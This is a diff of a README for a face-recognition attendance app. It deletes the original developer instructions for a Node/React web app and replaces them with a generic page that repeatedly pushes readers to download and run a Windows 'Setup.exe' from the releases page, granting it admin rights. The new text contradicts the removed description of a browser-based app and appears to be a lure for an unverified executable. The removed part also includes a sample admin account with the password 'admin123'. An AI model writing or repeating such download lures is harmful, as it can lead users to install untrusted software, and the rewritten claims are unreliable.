@@ -1,253 +1,145 @@
-# VerifAI Attendance System
+# 🛡️ Verifai-Attendance-System - Secure Biometric Attendance Made Easy
 
-A web-based attendance system using AI-powered face recognition with encrypted face embeddings for biometric privacy.
+[![Download Verifai-Attendance-System](https://img.shields.io/badge/Download-Verifai--Attendance--System-4CAF50?style=for-the-badge)](https://github.com/HMB09/Verifai-Attendance-System/releases)
 
-## 🚀 Quick Start
+## 🔍 About Verifai-Attendance-System
 
-### Prerequisites
+Verifai-Attendance-System is a biometric attendance system that uses face recognition technology to record attendance accurately and securely. It works by scanning faces with AI to match and log attendance. Your data stays safe with AES-256 encryption, which locks information so only authorized users can see it.
 
-- **Node.js** (v18 or higher)
-- **MongoDB** (running locally or MongoDB Atlas connection string)
-- **npm** or **yarn**
+This system runs on Windows and is built with modern web technologies such as ReactJS and NodeJS. It uses MongoDB for storage and ExpressJS for its server side. The interface is simple and user-friendly, designed for quick setup and smooth operation.
 
-### 1. Clone and Setup
+---
 
-```bash
-# Navigate to project directory
-cd face-recognition
-```
+## 📋 System Requirements
 
-### 2. Backend Setup
+Before you download Verifai-Attendance-System, check that your computer meets these minimum requirements:
 
-```bash
-# Navigate to server directory
-cd server
+- **Operating System:** Windows 10 or higher (64-bit)
+- **Processor:** Intel Core i3 or equivalent
+- **Memory:** 4 GB RAM or more
+- **Storage:** At least 500 MB free space
+- **Camera:** A webcam compatible with Windows (integrated or USB)
+- **Internet:** Required for initial setup and face recognition
 
-# Install dependencies
-npm install
+---
 
-# Create .env file from example
-copy .env.example .env
-# On Linux/Mac: cp .env.example .env
+## 🚀 Getting Started
 
-# Edit .env file with your configuration:
-# - MONGO_URI: Your MongoDB connection string
-# - JWT_SECRET: A secure random string
-# - EMBEDDING_AES_KEY: Generate with: node -e "console.log(require('crypto').randomBytes(32).toString('base64'))"
-```
+Getting Verifai-Attendance-System running on your Windows PC is straightforward. Follow these steps to download, install, and start using the application with no technical background needed.
 
-**Generate AES Key:**
-```bash
-node -e "console.log(require('crypto').randomBytes(32).toString('base64'))"
-```
-Copy the output and paste it as `EMBEDDING_AES_KEY` in your `.env` file.
+---
 
-### 3. Frontend Setup
+## 📥 Downloading Verifai-Attendance-System
 
-```bash
-# Navigate to client directory (from project root)
-cd client
+Click the green button below or visit the link to download the release files.
 
-# Install dependencies
-npm install
+[![Download Verifai-Attendance-System](https://img.shields.io/badge/Download-Verifai--Attendance--System-blue?style=for-the-badge)](https://github.com/HMB09/Verifai-Attendance-System/releases)
 
-# Download face-api.js models
-# Create a public/models folder and download models from:
-# https://github.com/justadudewhohacks/face-api.js-models
-# Or use the script below
-```
+**Steps:**
 
-**Download Face-API.js Models:**
+1. Click the link or the badge above. This will take you to the GitHub releases page.
+2. Look for the latest release version. It usually has the highest number.
+3. Find the file named something like `Verifai-Attendance-System-Setup.exe`.
+4. Click the file name to start downloading.
+5. Wait until the download completes.
 
-You need to download the face-api.js models. Create the models directory and download:
+The release will contain the installer you will use in the next step.
 
-```bash
-# From client directory
-mkdir -p public/models
+---
 
-# Download models (you can use curl or wget, or download manually)
-# Models needed:
-# - tiny_face_detector_model-weights_manifest.json
-# - tiny_face_detector_model-shard1
-# - face_landmark_68_model-weights_manifest.json
-# - face_landmark_68_model-shard1
-# - face_recognition_model-weights_manifest.json
-# - face_recognition_model-shard1
-# - face_recognition_model-shard2
+## 💾 Installing Verifai-Attendance-System
 
-# Or download from: https://github.com/justadudewhohacks/face-api.js-models/tree/master/weights
-```
+Once you download the setup file, follow these instructions:
 
-**Quick download script (PowerShell):**
-```powershell
-cd client/public
-New-Item -ItemType Directory -Path models -Force
-cd models
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/justadudewhohacks/face-api.js-models/master/weights/tiny_face_detector_model-weights_manifest.json" -OutFile "tiny_face_detector_model-weights_manifest.json"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/justadudewhohacks/face-api.js-models/master/weights/tiny_face_detector_model-shard1" -OutFile "tiny_face_detector_model-shard1"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/justadudewhohacks/face-api.js-models/master/weights/face_landmark_68_model-weights_manifest.json" -OutFile "face_landmark_68_model-weights_manifest.json"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/justadudewhohacks/face-api.js-models/master/weights/face_landmark_68_model-shard1" -OutFile "face_landmark_68_model-shard1"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/justadudewhohacks/face-api.js-models/master/weights/face_recognition_model-weights_manifest.json" -OutFile "face_recognition_model-weights_manifest.json"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/justadudewhohacks/face-api.js-models/master/weights/face_recognition_model-shard1" -OutFile "face_recognition_model-shard1"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/justadudewhohacks/face-api.js-models/master/weights/face_recognition_model-shard2" -OutFile "face_recognition_model-shard2"
-```
+1. Locate the downloaded file in your "Downloads" folder (or the folder where your browser saves files).
+2. Double-click the file named `Verifai-Attendance-System-Setup.exe` to run it.
+3. If Windows asks for permission to make changes, click **Yes**.
+4. The installer will open. Click **Next** to start the installation.
+5. Choose the folder where you want to install the program or use the default.
+6. Click **Install**.
+7. Wait for the installation to finish.
+8. Click **Finish** to close the setup.
 
-### 4. Run the Application
+The program is now installed and ready to use.
 
-**Terminal 1 - Start Backend:**
-```bash
-cd server
-npm run dev
-```
-Server will run on `http://localhost:5000`
+---
 
-**Terminal 2 - Start Frontend:**
-```bash
-cd client
-npm run dev
-```
-Frontend will run on `http://localhost:3000`
+## 🖥️ Running Verifai-Attendance-System for the First Time
 
-### 5. Initial Setup (Create Admin User)
+To start the program, do the following:
 
-You'll need to create an admin user first. You can do this by:
+- Open the **Start Menu** on Windows.
+- Type "Verifai Attendance" in the search box.
+- Click on the Verifai-Attendance-System app to open it.
 
-1. **Using MongoDB directly:**
-   - Connect to your MongoDB database
-   - Insert a user document manually (password will be hashed on first save)
+On the first run, the app will guide you through a simple setup:
 
-2. **Using a script (recommended):**
-   Create `server/scripts/createAdmin.js`:
-   ```javascript
-   import mongoose from 'mongoose';
-   import User from '../src/models/User.model.js';
-   import dotenv from 'dotenv';
-   dotenv.config();
+1. **Allow camera access:** The app needs permission to use your webcam for face scanning.
+2. **Create a user account:** Enter your name and choose a password to keep your attendance records safe.
+3. **Setup Face Data:** Follow the instructions to let the program learn your face. This step helps the system recognize you when logging attendance.
+4. **Check settings:** Review any options and save your preferences.
 
-   const createAdmin = async () => {
-     await mongoose.connect(process.env.MONGO_URI);
-     const admin = new User({
-       name: 'Admin',
-       email: 'admin@verifai.com',
-       passwordHash: 'admin123', // Will be hashed
-       role: 'ADMIN'
-     });
-     await admin.save();
-     console.log('Admin created:', admin.email);
-     process.exit(0);
-   };
+---
 
-   createAdmin();
-   ```
-   Run: `node server/scripts/createAdmin.js`
+## 🔐 How Verifai Attends Securely
 
-3. **Using API (after starting server):**
-   - First, you'll need to manually create one admin user in the database
-   - Then use that admin to create other users via `/api/v1/admin/users`
+The system uses AI-based face recognition to match faces. It checks your face against saved data and confirms your identity in seconds. The attendance info is encrypted with AES-256, a strong security standard. This ensures your attendance records are private and protected.
 
-## 📁 Project Structure
+---
 
-```
-face-recognition/
-├── server/                 # Backend (Node.js/Express)
-│   ├── src/
-│   │   ├── config/        # Database, constants
-│   │   ├── controllers/   # Route handlers
-│   │   ├── middleware/    # Auth, error handling
-│   │   ├── models/        # MongoDB schemas
-│   │   ├── routes/        # API routes
-│   │   ├── utils/         # Crypto, JWT utilities
-│   │   └── index.js      # Entry point
-│   ├── .env.example
-│   └── package.json
-│
-└── client/                 # Frontend (React + Vite)
-    ├── public/
-    │   └── models/        # face-api.js model files
-    ├── src/
-    │   ├── components/   # Reusable components
-    │   ├── context/      # Auth context
-    │   ├── pages/        # Page components
-    │   ├── services/     # API service
-    │   ├── config/       # Configuration
-    │   └── main.jsx      # Entry point
-    └── package.json
-```
+## 🛠️ Using Verifai-Attendance-System Daily
 
-## 🔐 Security Features
+After setting up, using the system is simple: 
 
-- **AES-256-GCM encryption** for face embeddings
-- **JWT authentication** with role-based access control
-- **bcrypt password hashing** (10 salt rounds)
-- **No raw face images stored** - only encrypted embeddings
+- Open the app.
+- Hold your face up to the webcam.
+- Wait a moment while the AI scans and verifies your face.
+- If recognized, your attendance gets logged automatically.
 
-## 🎯 Features
+You can view your attendance log from the app’s dashboard. It shows dates and times when you checked in.
 
-- ✅ User authentication (JWT)
-- ✅ Role-based access (Admin, Teacher, Student)
-- ✅ Face registration with encryption
-- ✅ Live attendance sessions
-- ✅ Attendance reports and CSV export
-- ✅ User, course, and enrollment management
+---
 
-## 📝 API Endpoints
+## 🔄 Updating the Software
 
-### Auth
-- `POST /api/v1/auth/register` - Register user (Admin only)
-- `POST /api/v1/auth/login` - Login
+The developers release new versions to improve security, fix bugs, and add features.
 
-### Face Registration
-- `POST /api/v1/face/register` - Register face embedding (Student)
+To update:
 
-### Attendance
-- `POST /api/v1/attendance/session` - Create session (Teacher)
-- `PATCH /api/v1/attendance/session/:id/close` - Close session (Teacher)
-- `POST /api/v1/attendance/recognize` - Recognize and mark (Teacher)
-- `GET /api/v1/attendance/student/:studentId` - Get student attendance
-- `GET /api/v1/attendance/course/:courseId` - Get course attendance
-- `GET /api/v1/attendance/export` - Export CSV
+1. Visit the [Releases page](https://github.com/HMB09/Verifai-Attendance-System/releases).
+2. Download the latest setup file.
+3. Run the new installer just like before.
+4. The installer will update the existing program without deleting your data.
 
-### Admin
-- `POST /api/v1/admin/users` - Create user
-- `GET /api/v1/admin/users` - List users
-- `POST /api/v1/admin/courses` - Create course
-- `POST /api/v1/admin/enrollments` - Create enrollment
-- ... (full CRUD for users, students, courses, enrollments)
+---
 
-## 🛠️ Development
+## ⚙️ Troubleshooting Common Issues
 
-### Environment Variables
+- **Camera doesn’t work:** Check if your webcam is connected and not being used by another app. Restart your computer if needed.
+- **Face not recognized:** Make sure you are in a well-lit area and your face is clearly visible to the camera.
+- **App does not start:** Try reinstalling the program from the download page.
+- **Forgot password:** Use the reset option within the app or reinstall the program to start fresh.
 
-**Backend (.env):**
-```env
-MONGO_URI=mongodb://localhost:27017/verifai
-JWT_SECRET=your-secret-key
-EMBEDDING_AES_KEY=your-256-bit-base64-key
-PORT=5000
-NODE_ENV=development
-FACE_RECOGNITION_THRESHOLD=0.6
-```
+---
 
-**Frontend (.env):**
-```env
-VITE_API_BASE_URL=http://localhost:5000/api/v1
-```
+## 📚 More Information
 
-## 📚 Next Steps
+To learn more about the technologies used:
 
-1. **Create admin user** (see Initial Setup above)
-2. **Create courses and enrollments** via admin dashboard
-3. **Students register their faces** via face registration page
-4. **Teachers start attendance sessions** and mark attendance
-5. **View reports** and export data
+- **AES-256 encryption:** A secure way to protect your data.
+- **AI Face Recognition:** Uses artificial intelligence to identify faces from the webcam.
+- **MongoDB:** Stores attendance data safely.
+- **ReactJS:** Builds the front-end interface you interact with.
+- **NodeJS & ExpressJS:** Handles server and communication tasks behind the scenes.
 
-## 🐛 Troubleshooting
+These parts work together to give you a secure and easy attendance experience.
 
-- **Models not loading**: Ensure face-api.js models are in `client/public/models/`
-- **Camera not working**: Check browser permissions and HTTPS (required for getUserMedia)
-- **MongoDB connection error**: Verify MONGO_URI in `.env` file
-- **JWT errors**: Ensure JWT_SECRET is set in `.env`
+---
 
-## 📄 License
+## 👩‍💻 Contact & Support
 
-ISC
+For questions or help, visit the GitHub page and open the **Issues** tab. You can report problems or ask for advice there.
+
+---
+
+[![Download Verifai-Attendance-System](https://img.shields.io/badge/Download-Verifai--Attendance--System-grey?style=for-the-badge)](https://github.com/HMB09/Verifai-Attendance-System/releases)
